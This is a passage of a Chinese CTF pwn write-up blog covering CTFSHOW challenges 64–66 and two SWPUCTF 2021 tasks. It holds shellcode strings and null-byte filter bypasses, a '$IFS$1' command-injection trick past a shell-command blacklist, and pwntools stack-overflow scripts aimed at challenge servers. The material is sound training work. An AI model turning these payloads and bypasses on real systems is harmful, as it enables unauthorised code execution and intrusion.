<p><strong>原因：</strong></p>
<blockquote>
<p>在<code>mmap</code>函数中，提供的起始地址<code>addr</code>只是一个建议值，而不是必须遵循的值。如果操作系统能够满足这个建议，并且在指定的地址范围内没有冲突，那么它会将映射分配在提供的起始地址处。但是，并不是所有情况下都能够遵循这个建议。</p>
<p>在你的测试代码中，你提供了一个栈上的变量<code>b</code>的地址作为<code>buf</code>参数，然后希望<code>mmap</code>函数将映射分配在这个地址上。然而，操作系统通常会有地址空间布局的限制，特别是对于用户空间的内存分配，以避免与其他已存在的内存区域发生冲突。因此，虽然你提供了一个建议的地址，但实际上操作系统可能选择一个不同的地址来分配映射区域。</p>
<p>你的测试代码中，<code>buf</code>和<code>addr1</code>的地址并不相同，这是因为操作系统可能决定在一个与<code>buf</code>地址不同的地方分配映射区域。这并不是错误，而是操作系统的地址分配策略所致。</p>
<p>如果你想要确保<code>mmap</code>返回的地址与你提供的<code>buf</code>地址相同，你应该使用一个合适的地址，而不是栈上的变量地址。你可以在合法且可访问的地址范围内选择一个地址作为建议值，这样操作系统可能更有可能遵循你的建议。</p>
<p>总之，<code>mmap</code>函数的地址分配在很大程度上取决于操作系统的内存管理策略，提供的地址只是一个建议，不一定会被完全遵循。</p>
</blockquote>
<h2 id="pwn65-汇编分析-可见字符shellcode"><a href="#pwn65-汇编分析-可见字符shellcode" class="headerlink" title="pwn65(汇编分析&amp;可见字符shellcode)"></a>pwn65(汇编分析&amp;可见字符shellcode)</h2><p>用汇编还原之后的伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x410</span>）    </span><br><span class="line"><span class="keyword">for</span> i in input to range len</span><br><span class="line">    <span class="keyword">if</span> input &lt; len  </span><br><span class="line">    	<span class="keyword">return</span> </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> i &gt;= <span class="number">0x60</span>` and a &lt; <span class="number">0x7A</span>z</span><br><span class="line">	    	contiune</span><br><span class="line">	 	<span class="keyword">else</span> <span class="keyword">if</span> i &gt;= <span class="number">0x40</span>@ and a &lt; <span class="number">0x5A</span>Z</span><br><span class="line">	        	<span class="keyword">continue</span></span><br><span class="line">	      	<span class="keyword">else</span> <span class="keyword">if</span> a &gt;= <span class="number">0x2F</span>/ and a &lt; <span class="number">0x5A</span>Z</span><br><span class="line">		        <span class="keyword">continue</span></span><br><span class="line">		    <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>大概逻辑是shellcode在可见字符，大致区间（0x60，0x7A）和（0x40，0x5A)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">p.send(shellcode)</span><br></pre></td></tr></table></figure>

<h2 id="pwn66-shellcode判断逻辑绕过"><a href="#pwn66-shellcode判断逻辑绕过" class="headerlink" title="pwn66(shellcode判断逻辑绕过)"></a>pwn66(shellcode判断逻辑绕过)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check</span><span class="params">(<span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *i; <span class="comment">// 声明一个字符指针 i</span></span><br><span class="line">  <span class="keyword">while</span> (*buf) <span class="comment">// 当 buf 不为 null 继续循环</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="string">&quot;ZZJ loves shell_code,and here is a gift:\x0F\x05 enjoy it!\n&quot;</span>; *i &amp;&amp; *i != *buf; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 在这个循环中，i 逐个字符与 buf 中的字符进行比较</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 循环结束后，检查 i 是否为空或者 buf 中的字符在 i 中找到</span></span><br><span class="line">    <span class="keyword">if</span> (!*i)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>; <span class="comment">// 如果 buf 中的字符没有在 i 中找到，返回 0</span></span><br><span class="line">    ++buf; <span class="comment">// 移动到下一个字符</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>; <span class="comment">// 如果 buf 中的字符都在 i 中找到，返回 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里绕过buf不为null的不再循环，这里对shellcode的开头写入\x00进行截断即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;\x00\xc0&#x27;</span> + asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br></pre></td></tr></table></figure>

<ul>
<li>寻找以\X00的shellcode</li>
</ul>
<p><strong>注意点：</strong>这里不能只用\X00进行截断，因为shellcode是线性反汇编，这样的话shellcode完整性会受到破坏，必须要是一个完整的汇编语句，下面代码是寻找这种汇编语句的代码，运行后可以发现shellcode的会受到影响</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(disasm(payload))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>) </span><br><span class="line"><span class="built_in">print</span>(disasm(<span class="string">b&#x27;\x00\xc0&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;\x00\xc0&#x27;</span> + asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>) </span><br><span class="line"><span class="built_in">print</span>(disasm(payload))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>) </span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(disasm(payload))</span><br></pre></td></tr></table></figure>

<p>寻找代码(待研究)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环尝试生成各个长度的字节数组</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">    <span class="comment"># 使用 itertools.product 生成长度为 i 的字节组合，即生成所有 i 长度的组合</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> product([p8(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)], repeat=i):</span><br><span class="line">        payload = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;&quot;</span>.join(j)  <span class="comment"># 构造一个字节数组，首字节为 0x00，后面为 itertools 生成的组合</span></span><br><span class="line">        res = disasm(payload)  <span class="comment"># 反汇编 payload 字节数组</span></span><br><span class="line">        <span class="comment"># 根据一些条件进行筛选</span></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            res != <span class="string">&quot;...&quot;</span>  <span class="comment"># 不等于 &quot;...&quot;（未反汇编成功的情况）</span></span><br><span class="line">            <span class="keyword">and</span> <span class="keyword">not</span> re.search(<span class="string">r&quot;\[\w*?\]&quot;</span>, res)  <span class="comment"># 不包含形如 [some_variable] 的内容</span></span><br><span class="line">            <span class="keyword">and</span> <span class="string">&quot;.byte&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res  <span class="comment"># 不包含 &quot;.byte&quot; 指令（表示单个字节的指令）</span></span><br><span class="line">        ):</span><br><span class="line">            <span class="built_in">print</span>(res)  <span class="comment"># 打印反汇编结果</span></span><br><span class="line">            <span class="built_in">input</span>()  <span class="comment"># 等待用户输入，用于逐步查看结果</span></span><br></pre></td></tr></table></figure>



<h1 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h1><h2 id="SWPUCTF-2021-新生赛-nc签到（字符串过滤）"><a href="#SWPUCTF-2021-新生赛-nc签到（字符串过滤）" class="headerlink" title="[SWPUCTF 2021 新生赛]nc签到（字符串过滤）"></a>[SWPUCTF 2021 新生赛]nc签到（字符串过滤）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>这里的${IFS}加大括号的原因是这样的</p>
<blockquote>
<p>在Unix和Unix-like系统（包括Linux）的shell中，<code>$&#123;IFS&#125;</code>使用大括号的形式是为了明确地指定一个环境变量。大括号在这里的作用是告诉shell，<code>$&#123;IFS&#125;</code>是一个环境变量的名称，而不是一个常规的字符串。</p>
<p><code>$&#123;IFS&#125;</code>中的<code>IFS</code>是一个特殊的环境变量，表示”Internal Field Separator”（内部字段分隔符）。它用于定义用于分隔单词和字段的字符，默认情况下包含空格、制表符和换行符。</p>
<p>在大括号内使用<code>$&#123;IFS&#125;</code>是一种良好的编程实践，尤其是在以下情况下：</p>
<ol>
<li>当需要将环境变量放在复杂的表达式中，以确保shell正确识别变量的边界。</li>
<li>当环境变量名后面跟着其他字符时，用大括号来明确指定变量的范围。</li>
</ol>
<p>例如，<code>$&#123;IFS&#125;abc</code>将会将<code>IFS</code>与<code>abc</code>拼接在一起，以生成一个新的字符串，而不是将<code>IFS</code>视为一个完整的变量名。</p>
<p>总之，使用大括号<code>$&#123;&#125;</code>来引用环境变量是一种良好的编程习惯，可以避免因变量名与其他字符混淆而引发错误。但在<code>$&#123;IFS&#125;</code>这个特定的例子中，如果<code>IFS</code>后面没有紧跟其他字符，大括号并不是必需的。所以在<code>$&#123;IFS&#125;</code>和<code>$IFS</code>之间没有实际的差异。</p>
</blockquote>
<p>但是，这里的字符串过滤中过滤掉了{IFS}，所以我们只能用空字符将其和后面的字符进行截断，这里使用的是$1,<code>$1</code>表示脚本或函数的第一个位置参数，为什么用这个呢？请看：</p>
<blockquote>
<p>如果没有传递任何参数给脚本，那么<code>$1</code>将为空。在这种情况下，<code>echo $1</code>将只打印出一个空行</p>
</blockquote>
<p>所以可以准确得出这里的$1可以将字符串进行截断，然后使用$IFS告诉终端这是一个环境变量代表的是空格，从而进行输出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">art = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   ((  &quot;####@@!!$$    ))</span></span><br><span class="line"><span class="string">       `#####@@!$$`  ))</span></span><br><span class="line"><span class="string">    ((  &#x27;####@!!$:</span></span><br><span class="line"><span class="string">   ((  ,####@!!$:   ))</span></span><br><span class="line"><span class="string">       .###@!!$:</span></span><br><span class="line"><span class="string">       `##@@!$:</span></span><br><span class="line"><span class="string">        `#@!!$</span></span><br><span class="line"><span class="string">  !@#    `#@!$:       @#$</span></span><br><span class="line"><span class="string">   #$     `#@!$:       !@!</span></span><br><span class="line"><span class="string">            &#x27;@!$:</span></span><br><span class="line"><span class="string">        &#x27;`\   &quot;!$: /`&#x27;</span></span><br><span class="line"><span class="string">           &#x27;\  &#x27;!: /&#x27;</span></span><br><span class="line"><span class="string">             &quot;\ : /&quot;</span></span><br><span class="line"><span class="string">  -.&quot;-/\\\-.&quot;//.-&quot;/:`\.&quot;-.JrS&quot;.&quot;-=_\\</span></span><br><span class="line"><span class="string">&quot; -.&quot;-.\\&quot;-.&quot;//.-&quot;.`-.&quot;_\\-.&quot;.-\&quot;.-//&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(art)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My_shell_ProVersion&quot;</span>)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>()</span><br><span class="line">    <span class="built_in">print</span>(command)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            <span class="built_in">print</span>(command)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    os.system(command)</span><br><span class="line">    </span><br><span class="line">===================================================================================================================</span><br><span class="line">slove.py</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28994</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;tac$IFS$1flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="SWPUCTF-2021-新生赛-gift-pwn（栈溢出查看偏移）"><a href="#SWPUCTF-2021-新生赛-gift-pwn（栈溢出查看偏移）" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_pwn（栈溢出查看偏移）"></a>[SWPUCTF 2021 新生赛]gift_pwn（栈溢出查看偏移）</h2><ol>
<li>直接用ida查看0x10 + 8</li>
</ol>
<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230725121502497.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230725121502497.png"  class="" lazyload></a>

<ol start="2">
<li><p>gdb覆盖查看，从rsp到rbp</p>
<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230725121544874.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230725121544874.png"  class="" lazyload></a>
</li>
<li><p>cyclic 偏移查看： 一般cyclic -l 错误的偏移地址</p>
<p>这道题根据偏移直接送结果就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./attach&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28217</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p, s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line">system = <span class="number">0x400480</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(system)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="gdb查看内存命令"><a href="#gdb查看内存命令" class="headerlink" title="gdb查看内存命令"></a>gdb查看内存命令</h3><blockquote>
<p>&#x2F;s                 查看相应地址的字符串<br>x&#x2F;i 		       查看汇编指令<br>x&#x2F;gx			 查看相应地址的二进制信息<br>x&#x2F;wx			按照字节形式显示二进制信息</p>
</blockquote>
<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-1676879380338.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-1676879380338.png"  class="" lazyload></a>








        </div>
        <div class="top-div">
          <ol class="top-box"><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#CTFSHOW"><span class="top-box-text">CTFSHOW</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn37-38-return-text"><span class="top-box-text">pwn37&#x2F;38(return text)</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E6%9F%A5%E7%9C%8B%E5%86%85%E5%AD%98%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="top-box-text">查看内存常用命令</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn39%EF%BC%88%E6%B2%A1%E6%9C%89%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%EF%BC%89"><span class="top-box-text">pwn39（没有后门函数）</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn40%EF%BC%88%E6%B2%A1%E6%9C%89%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%EF%BC%8Cx64%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8%E4%BC%A0%E5%8F%82%E9%A1%BA%E5%BA%8F%EF%BC%89"><span class="top-box-text">pwn40（没有后门函数，x64的寄存器传参顺序）</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn41-42-bin-sh%E4%BD%BF%E7%94%A8sh%E4%BB%A3%E6%9B%BF"><span class="top-box-text">pwn41&#x2F;42(&#x2F;bin&#x2F;sh使用sh代替)</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn43-44%EF%BC%88%E6%9E%84%E9%80%A0-bin-sh-gdb%E8%B0%83%E8%AF%95%E8%B7%9F%E8%B8%AA%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E6%B5%81%E7%A8%8B%EF%BC%89"><span class="top-box-text">pwn43&#x2F;44（构造&#x2F;bin&#x2F;sh,gdb调试跟踪参数传递流程）</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn45-46-got%E8%A1%A8%E6%B3%84%E9%9C%B2-ret2libc"><span class="top-box-text">pwn45&#x2F;46(got表泄露) ret2libc</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn47-48%EF%BC%88ret2libc-LibcSeacher%EF%BC%89"><span class="top-box-text">pwn47&#x2F;48（ret2libc - LibcSeacher）</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E5%9B%9B%E4%B8%AAlibc%E7%9B%AE%E5%BD%95%E5%8C%BA%E5%88%AB"><span class="top-box-text">四个libc目录区别</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%EF%BC%9A%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E6%9D%83%E9%99%90mprotect"><span class="top-box-text">pwn49(静态编译：修改内存权限mprotect)</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#mprotect%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B"><span class="top-box-text">mprotect函数原型</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#read%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B"><span class="top-box-text">read函数原型</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#pop-edx"><span class="top-box-text">pop_edx</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn50-mprotect-ret2libc"><span class="top-box-text">pwn50(mprotect ret2libc )</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E5%BD%A9%E8%9B%8B%EF%BC%9A%E8%A7%A3%E5%86%B3%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95%E9%97%AE%E9%A2%98"><span class="top-box-text">彩蛋：解决中文输入法问题</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#ret2libc"><span class="top-box-text">ret2libc</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#mprotect-%EF%BC%88shellcode-%E8%AE%B0%E5%BE%97%E6%9E%B6%E6%9E%84%E8%A6%81%E5%AF%B9%EF%BC%89"><span class="top-box-text">mprotect （shellcode 记得架构要对）</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn51-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%8Cstrcpy%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E"><span class="top-box-text">pwn51(逆向分析漏洞，strcpy函数漏洞)</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn52%EF%BC%88%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%B0%83%E8%AF%95%E6%8E%A7%E5%88%B6%EF%BC%89"><span class="top-box-text">pwn52（函数传参调试控制）</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn53-canary%E4%BF%9D%E6%8A%A4%E4%B8%8E%E7%88%86%E7%A0%B4%E7%BB%95%E8%BF%87"><span class="top-box-text">pwn53(canary保护与爆破绕过)</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC"><span class="top-box-text">爆破脚本</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#pwntools%EF%BC%9A%E5%A4%A7%E7%AB%AF%E5%BA%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E5%BA%8F"><span class="top-box-text">pwntools：大端序和小端序</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn54%EF%BC%88%E5%88%A9%E7%94%A8%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%89"><span class="top-box-text">pwn54（利用内存布局栈溢出）</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#puts%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7"><span class="top-box-text">puts函数特性</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E6%80%9D%E8%B7%AF-%E8%80%83%E7%82%B9"><span class="top-box-text">思路&amp;考点</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E4%BB%A3%E7%A0%81"><span class="top-box-text">代码</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn55-%E6%A0%B9%E6%8D%AE%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%85%B3%E7%B3%BB%E6%8B%BC%E6%8E%A5payload"><span class="top-box-text">pwn55(根据函数调用关系拼接payload)</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn56-57-32%E4%BD%8D-64%E4%BD%8D-shellcode%E5%88%86%E6%9E%90"><span class="top-box-text">pwn56&#x2F;57(32位  64位  shellcode分析)</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#32%E4%BD%8D%E8%A7%A3%E6%9E%90"><span class="top-box-text">32位解析</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#execve%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B"><span class="top-box-text">execve函数原型</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%BB%8B%E7%BB%8D"><span class="top-box-text">系统调用介绍</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%88x86%EF%BC%89"><span class="top-box-text">32位系统中的系统调用（x86）</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#64%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%88x86-64%EF%BC%89"><span class="top-box-text">64位系统中的系统调用（x86_64）</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn58-59%EF%BC%88ret2shellcode%EF%BC%89"><span class="top-box-text">pwn58&#x2F;59（ret2shellcode）</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn60-vmmap%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98"><span class="top-box-text">pwn60(vmmap本地权限问题)</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn61%EF%BC%88leave-ret%E5%92%8Cret%E5%91%BD%E4%BB%A4%EF%BC%89"><span class="top-box-text">pwn61（leave ret和ret命令）</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn62-63-shellcode-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="top-box-text">pwn62&#x2F;63(shellcode 长度限制)</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn64-mmap%E5%87%BD%E6%95%B0"><span 